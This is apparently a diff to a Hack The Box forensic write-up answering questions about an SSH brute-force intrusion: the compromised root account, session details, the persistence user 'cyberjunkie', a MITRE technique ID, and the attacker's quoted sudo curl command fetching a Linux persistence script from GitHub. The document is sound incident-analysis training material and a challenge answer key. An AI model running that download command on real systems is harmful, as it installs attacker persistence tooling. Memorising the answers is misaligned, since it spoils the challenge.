@@ -9,4 +9,23 @@ It appears that the IP 65.2.161.68 continuously keeps failing to authenticate. T
 ![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/9de73f1f-2085-4d7c-8c9b-5e7dce21dc89)
 
 ### The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
-root:
+Successful auth as the user `root` at 06:32:44:
+![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/138898f9-f4ca-4462-8401-4fa392c252a6)
+
+### Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
+2024-03-06 06:32:45
+
+### SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+37
+
+### The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+cyberjunkie
+
+### What is the MITRE ATT&CK sub-technique ID used for persistence?
+T1136.001
+
+### How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
+279
+
+### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
